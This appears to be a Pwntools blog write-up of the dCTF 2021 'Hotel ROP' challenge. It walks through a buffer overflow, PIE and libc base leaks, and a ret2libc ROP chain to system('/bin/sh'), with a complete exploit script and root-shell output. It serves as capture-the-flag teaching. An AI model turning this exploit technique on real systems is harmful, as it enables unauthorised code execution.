@@ -1,0 +1,392 @@
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>dCTF 2021 - Hotel ROP - Pwntools Blog</title>
+<meta name=description content="Returning 2 LIBC in a PIE enabled binary">
+<meta name=author content="Team Gallopsled"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"Pwntools Blog","url":"https:\/\/blog.pwntools.com\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/blog.pwntools.com\/"}</script>
+<script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/blog.pwntools.com\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/blog.pwntools.com\/posts\/dctf-2021-hotel-rop-ret2libc-pie\/","name":"D ctf 2021 hotel rop"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"\u003ca href=\u0027https:\/\/caprinux.github.io\u0027\u003eelma\u003c\/a\u003e"},"headline":"dCTF 2021 - Hotel ROP","description":"Today, we will be looking at a pwn challenge from dCTF 2021 which features ret2libc exploitation with a little twist of a PIE-enabled binary. The following PwnTools features will be introduced here:\n pwnlib.rop to help us craft ROP chains pwnlib.elf to make finding addresses quick and easy and many more little modules from pwntools to help us pwn faster ~  Challenge Description   They say programmers\u0027 dream is California.","inLanguage":"en","wordCount":828,"datePublished":"2021-05-24T20:22:21","dateModified":"2021-05-24T20:22:21","image":"https:\/\/blog.pwntools.com\/img\/logo.png","keywords":["pie, aslr, easy, elf, libc"],"mainEntityOfPage":"https:\/\/blog.pwntools.com\/posts\/dctf-2021-hotel-rop-ret2libc-pie\/","publisher":{"@type":"Organization","name":"https:\/\/blog.pwntools.com\/","logo":{"@type":"ImageObject","url":"https:\/\/blog.pwntools.com\/img\/logo.png","height":60,"width":60}}}</script>
+<meta property="og:title" content="dCTF 2021 - Hotel ROP">
+<meta property="og:description" content="Returning 2 LIBC in a PIE enabled binary">
+<meta property="og:image" content="https://blog.pwntools.com/img/logo.png">
+<meta property="og:url" content="https://blog.pwntools.com/posts/dctf-2021-hotel-rop-ret2libc-pie/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Pwntools Blog">
+<meta name=twitter:title content="dCTF 2021 - Hotel ROP">
+<meta name=twitter:description content="Returning 2 LIBC in a PIE enabled binary">
+<meta name=twitter:image content="https://blog.pwntools.com/img/logo.png">
+<meta name=twitter:card content="summary">
+<meta name=twitter:site content="@Pwntools">
+<meta name=twitter:creator content="@Pwntools">
+<meta name=generator content="Hugo 0.88.1">
+<link rel=alternate href=https://blog.pwntools.com/index.xml type=application/rss+xml title="Pwntools Blog"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y crossorigin=anonymous>
+<link rel=stylesheet href=https://use.fontawesome.com/releases/v5.5.0/css/all.css integrity=sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU crossorigin=anonymous>
+<link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css integrity=sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u crossorigin=anonymous><link rel=stylesheet href=https://blog.pwntools.com/css/main.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+<link rel=stylesheet href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><link rel=stylesheet href=https://blog.pwntools.com/css/syntax.css><link rel=stylesheet href=https://blog.pwntools.com/css/codeblock.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css integrity=sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh crossorigin=anonymous>
+<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css integrity=sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R crossorigin=anonymous>
+</head>
+<body>
+<nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+<div class=container-fluid>
+<div class=navbar-header>
+<button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=https://blog.pwntools.com/>Pwntools Blog</a>
+</div>
+<div class="collapse navbar-collapse" id=main-navbar>
+<ul class="nav navbar-nav navbar-right">
+<li>
+<a title=Discord href=https://discord.gg/96VA2zvjCB>Discord</a>
+</li>
+<li>
+<a title=Docs href=https://docs.pwntools.com>Docs</a>
+</li>
+<li>
+<a title=Tutorials href=https://github.com/Gallopsled/pwntools-tutorial/blob/master/README.md>Tutorials</a>
+</li>
+<li>
+<a href=#modalSearch data-toggle=modal data-target=#modalSearch style=outline:none>
+<span class="hidden-sm hidden-md hidden-lg">Search</span> <span id=searchGlyph class="glyphicon glyphicon-search"></span>
+</a>
+</li>
+</ul>
+</div>
+<div class=avatar-container>
+<div class=avatar-img-border>
+<a title="Pwntools Blog" href=https://blog.pwntools.com/>
+<img class=avatar-img src=https://blog.pwntools.com/img/logo.png alt="Pwntools Blog">
+</a>
+</div>
+</div>
+</div>
+</nav>
+<div id=modalSearch class="modal fade" role=dialog>
+<div class=modal-dialog>
+<div class=modal-content>
+<div class=modal-header>
+<button type=button class=close data-dismiss=modal>&#215;</button>
+<h4 class=modal-title>Search Pwntools Blog</h4>
+</div>
+<div class=modal-body>
+<gcse:search></gcse:search>
+</div>
+<div class=modal-footer>
+<button type=button class="btn btn-default" data-dismiss=modal>Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
+<div class=pswp__bg></div>
+<div class=pswp__scroll-wrap>
+<div class=pswp__container>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class=pswp__top-bar>
+<div class=pswp__counter></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class=pswp__preloader>
+<div class=pswp__preloader__icn>
+<div class=pswp__preloader__cut>
+<div class=pswp__preloader__donut></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class=pswp__share-tooltip></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class=pswp__caption>
+<div class=pswp__caption__center></div>
+</div>
+</div>
+</div>
+</div>
+<header class=header-section>
+<div class="intro-header no-img">
+<div class=container>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<div class=posts-heading>
+<h1>dCTF 2021 - Hotel ROP</h1>
+<hr class=small>
+<h2 class=posts-subheading>Returning 2 LIBC in a PIE enabled binary</h2>
+</div>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class=container role=main>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<article role=main class=blog-post>
+<p>Today, we will be looking at a pwn challenge from <strong>dCTF 2021</strong> which features ret2libc exploitation with a little twist of a <code>PIE-enabled</code> binary. The following PwnTools features will be introduced here:</p>
+<ul>
+<li><strong><a href=https://docs.pwntools.com/en/stable/rop/rop.html>pwnlib.rop</a></strong> to help us craft ROP chains</li>
+<li><strong><a href=https://docs.pwntools.com/en/stable/elf.html>pwnlib.elf</a></strong> to make finding addresses quick and easy</li>
+<li>and many more little modules from <code>pwntools</code> to help us pwn faster ~</li>
+</ul>
+<h2 id=challenge-description>Challenge Description</h2>
+<hr>
+<blockquote>
+<p>They say programmers' dream is California. And because they need somewhere to stay, we&rsquo;ve built a hotel!</p>
+<p>Attachments: <a href=/content/files/hotel_rop>hotel_rop</a></p>
+</blockquote>
+<h2 id=getting-started>Getting Started</h2>
+<hr>
+<p>For this challenge, we are provided with a binary and nothing else.</p>
+<p>We quickly check the security features of the binary with <code>pwn checksec hotel_rop</code> which returns</p>
+<pre>
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#5c5cff>*</span>] &apos;/media/sf_dabian/Challenges/dctf/pwn/hotel_rop&apos;
+    Arch:     amd64-64-little
+    RELRO:    <span style=color:#cdcd00>Partial RELRO</span>
+    Stack:    <span style=color:#cd0000>No canary found</span>
+    NX:       <span style=color:#00cd00>NX enabled</span>
+    PIE:      <span style=color:#00cd00>PIE enabled</span>
+</pre>
+<p>As shown, <code>PIE</code> and <code>NX</code> is enabled. Let&rsquo;s run the binary and check out what we are dealing with</p>
+<pre tabindex=0><code>➜ ./hotel_rop
+Welcome to Hotel ROP, on main street 0x55e4cd29636d
+You come here often?
+test
+I think you should come here more often.
+</code></pre><p>As you can see, we are given a leak and an input. Let&rsquo;s decompile and look at what&rsquo;s going on behind the scenes.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
+<span class=p>{</span>
+  <span class=n>alarm</span><span class=p>(</span><span class=mh>0xAu</span><span class=p>);</span>
+  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Welcome to Hotel ROP, on main street %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>main</span><span class=p>);</span>
+  <span class=n>vuln</span><span class=p>();</span>
+  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>vuln</span><span class=p>()</span>
+<span class=p>{</span>
+  <span class=kt>int</span> <span class=n>result</span><span class=p>;</span>
+  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>28</span><span class=p>];</span>
+  <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span>
+
+  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;You come here often?&#34;</span><span class=p>);</span>
+  <span class=n>fgets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>256</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
+  <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=p>)</span>
+    <span class=n>result</span> <span class=o>=</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;I think you should come here more often.&#34;</span><span class=p>);</span>
+  <span class=k>else</span>
+    <span class=n>result</span> <span class=o>=</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Oh! You are already a regular visitor!&#34;</span><span class=p>);</span>
+  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+<span class=p>}</span>
+
+</code></pre></div><p>As you can see, we have a leak which points to <code>main()</code>, and we have a <strong>buffer overflow</strong> in <code>vuln()</code> as we are given <strong>256 bytes of input</strong> into a variable that holds <strong>28 bytes of data</strong>.</p>
+<p>With this, it becomes rather apparent that we have to do a <code>ret2libc</code> in order to spawn a shell and win. However, since this binary is <code>PIE</code> enabled, we have to first calculate the <code>PIE</code> base.</p>
+<h2 id=exploitation>Exploitation</h2>
+<hr>
+<h3 id=stage-1-calculate-pie-base>Stage 1: Calculate PIE base</h3>
+<p>Since we know that our leak is the address of <code>main()</code>, we can easily calculate our offset with <code>elf.sym.main</code> and set it as the base_address by saving it to <code>elf.address</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;hotel_rop&#39;</span><span class=p>)</span>
+<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./hotel_rop&#39;</span><span class=p>)</span>
+<span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span> <span class=c1># set libc</span>
+
+<span class=c1>#: RECEIVE LEAK CALCULATE PIE BASE</span>
+<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;main street &#39;</span><span class=p>)</span>
+<span class=n>mainleak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
+<span class=c1># use elf to save find main address and save PIE base into elf.address</span>
+<span class=n>elf</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>mainleak</span> <span class=o>-</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>main</span>
+
+<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;pie base @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>address</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+</code></pre></div><p>OUTPUT:</p>
+<pre>
+[<span style=color:#cd00cd>x</span>] Starting local process &apos;./hotel_rop&apos;
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#0f0>+</span>] Starting local process &apos;./hotel_rop&apos;: pid 19494
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#5c5cff>*</span>] Stopped process &apos;./hotel_rop&apos; (pid 19494)
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#5c5cff>*</span>] pie base &#64; 0x562e0d3bf000
+</pre>
+<p>Running the script, we see that we successfully found PIE base.</p>
+<h3 id=stage-2-leak-and-calculate-libc-base>Stage 2: Leak and calculate LIBC base</h3>
+<p>Since LIBC is ASLR-enabled, we also have to calculate the LIBC base. This means we will need a LIBC leak and we will do that in our <code>rop.chain()</code>.</p>
+<p>We will leak an address from the <code>GOT</code> which contains libc addresses, and from there, calculate our libc base address.</p>
+<p>Let&rsquo;s write our <code>rop.chain()</code>, but without having to find any gadgets or addresses ourselves!!</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py>
+
+
+<span class=c1>#: LEAK PUTS GOT  </span>
+
+<span class=c1># create rop chain</span>
+<span class=n>rop1</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
+<span class=n>rop1</span><span class=o>.</span><span class=n>puts</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>)</span>
+<span class=n>rop1</span><span class=o>.</span><span class=n>main</span><span class=p>()</span>
+<span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>rop1</span><span class=o>.</span><span class=n>dump</span><span class=p>())</span>
+<span class=c1># send rop chain with auto 40 bytes cyclic padding</span>
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>flat</span><span class=p>({</span> <span class=mi>40</span><span class=p>:</span> <span class=n>rop1</span><span class=o>.</span><span class=n>chain</span><span class=p>()}))</span>
+<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;often.</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+
+<span class=c1>#: CALCULATE LIBC BASE FIND BINSH</span>
+<span class=n>putsgotleak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+<span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>putsgotleak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>puts</span>
+
+<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;libc base @ </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
+
+
+</code></pre></div><p>OUTPUT:</p>
+<pre>
+
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#0f0>+</span>] Starting local process &apos;./hotel_rop&apos;: pid 19878
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#5c5cff>*</span>] pie base &#64; 0x562942b04000
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#5c5cff>*</span>] Loaded 14 cached gadgets for &apos;hotel_rop&apos;
+
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#5c5cff>*</span>] 0x0000:   0x562942b0540b pop rdi; ret
+    0x0008:   0x562942b08018 [arg0] rdi = got.puts
+    0x0010:   0x562942b05030 puts
+    0x0018:   0x562942b0536d main()
+
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#0f0>+</span>] libc base &#64; 0x7f9950b69000
+[<span style=font-weight:700;color:#7f7f7f></span><span style=font-weight:700;color:#5c5cff>*</span>] Stopped process &apos;./hotel_rop&apos; (pid 19878)
+
+</pre>
+<p>Success! Let&rsquo;s proceed with the last part of our exploit.</p>
+<h3 id=stage-3-return-2-libc-system>Stage 3: Return 2 LIBC System!</h3>
+<p>Now we have all the pieces we need to return to libc. This is super simple with pwntools as well, we simply need to look for our &lsquo;/bin/sh&rsquo; string with <code>libc.search()</code> and call <code>rop.system(binsh)</code>.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=c1># locates binsh string from libc</span>
+<span class=n>binsh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span>
+
+<span class=c1>#: POP SHELL</span>
+<span class=n>rop2</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>([</span><span class=n>libc</span><span class=p>,</span> <span class=n>elf</span><span class=p>])</span>
+<span class=n>rop2</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span>
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>flat</span><span class=p>({</span><span class=mi>40</span><span class=p>:</span> <span class=n>rop2</span><span class=o>.</span><span class=n>chain</span><span class=p>()}))</span>
+<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Enjoy your shell!&#39;</span><span class=p>)</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
+<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span> <span class=c1># win!</span>
+</code></pre></div><p>OUTPUT:</p>
+<pre tabindex=0><code>[*] 0x0000:   0x7f337c437796 pop rdi; ret
+    0x0008:   0x7f337c59b156 [arg0] rdi = 139859106312534
+    0x0010:   0x7f337c459e50 system
+[+] Enjoy your shell!
+[*] Switching to interactive mode
+
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+
+$ whoami
+root
+</code></pre><p>With that, we successfully popped a shell and pwned the binary!</p>
+<hr>
+<h4 id=clean-script>Clean Script</h4>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./hotel_rop&#39;</span><span class=p>)</span>
+<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;hotel_rop&#39;</span><span class=p>)</span>
+<span class=n>libc</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>libc</span>
+
+<span class=c1>#: RECEIVE LEAK CALCULATE PIE BASE</span>
+<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;main street &#39;</span><span class=p>)</span>
+<span class=n>mainleak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
+<span class=n>elf</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>mainleak</span> <span class=o>-</span> <span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>main</span>
+
+
+<span class=c1>#: LEAK PUTS GOT  </span>
+<span class=n>rop1</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
+<span class=n>rop1</span><span class=o>.</span><span class=n>puts</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>puts</span><span class=p>)</span>
+<span class=n>rop1</span><span class=o>.</span><span class=n>main</span><span class=p>()</span>
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>flat</span><span class=p>({</span> <span class=mi>40</span><span class=p>:</span> <span class=n>rop1</span><span class=o>.</span><span class=n>chain</span><span class=p>()}))</span>
+<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;often.</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+
+<span class=c1>#: CALCULATE LIBC BASE FIND BINSH</span>
+<span class=n>putsgotleak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+<span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>putsgotleak</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>puts</span>
+<span class=n>binsh</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span>
+
+<span class=c1>#: POP SHELL</span>
+<span class=n>rop2</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>([</span><span class=n>libc</span><span class=p>,</span> <span class=n>elf</span><span class=p>])</span>
+<span class=n>rop2</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span>
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>flat</span><span class=p>({</span><span class=mi>40</span><span class=p>:</span> <span class=n>rop2</span><span class=o>.</span><span class=n>chain</span><span class=p>()}))</span>
+<span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Enjoy your shell!&#39;</span><span class=p>)</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
+<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</code></pre></div><hr>
+<p>This post was contributed by Elma. Check him out on his <a href=https://caprinux.github.io>blog</a>!</p>
+<div class=blog-tags>
+<a href=https://blog.pwntools.com//tags/pie/>pie</a>&nbsp;
+<a href=https://blog.pwntools.com//tags/aslr/>aslr</a>&nbsp;
+<a href=https://blog.pwntools.com//tags/easy/>easy</a>&nbsp;
+<a href=https://blog.pwntools.com//tags/elf/>elf</a>&nbsp;
+<a href=https://blog.pwntools.com//tags/libc/>libc</a>&nbsp;
+</div>
+</article>
+<ul class="pager blog-pager">
+<li class=previous>
+<a href=https://blog.pwntools.com/posts/got-overwrite/ data-toggle=tooltip data-placement=top title="Simple GOT Overwrite">&larr; Previous Post</a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<footer>
+<div class=container>
+<div class=row>
+<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<ul class="list-inline text-center footer-links">
+<li>
+<a href=https://github.com/Gallopsled/pwntools#readme title=GitHub>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+<li>
+<a href=https://twitter.com/Pwntools title=Twitter>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+<li>
+<a href=https://discord.gg/96VA2zvjCB title=Discord>
+<span class="fa-stack fa-lg">
+<i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-discord fa-stack-1x fa-inverse"></i>
+</span>
+</a>
+</li>
+</ul>
+<p class="credits copyright text-muted">
+<a href=https://github.com/Gallopsled>Team Gallopsled</a>
+&nbsp;&bull;&nbsp;&copy;
+2021
+All Rights Reserved
+&nbsp;&bull;&nbsp;
+<a href=https://blog.pwntools.com/>Pwntools Blog</a>
+</p>
+<p class="credits theme-by text-muted">
+<a href=https://gohugo.io>Hugo v0.88.1</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a>
+</p>
+</div>
+</div>
+</div>
+</footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe crossorigin=anonymous></script>
+<script src=https://code.jquery.com/jquery-1.12.4.min.js integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin=anonymous></script>
+<script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script>
+<script src=https://blog.pwntools.com/js/main.js></script><script>renderMathInElement(document.body)</script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://blog.pwntools.com/js/load-photoswipe.js></script>
+<script>(function(){var c='a6e761131baa51ced',a=document.createElement('script'),b;a.type='text/javascript',a.async=!0,a.src='https://cse.google.com/cse.js?cx='+c,b=document.getElementsByTagName('script')[0],b.parentNode.insertBefore(a,b)})()</script>
+</body>
+</html>
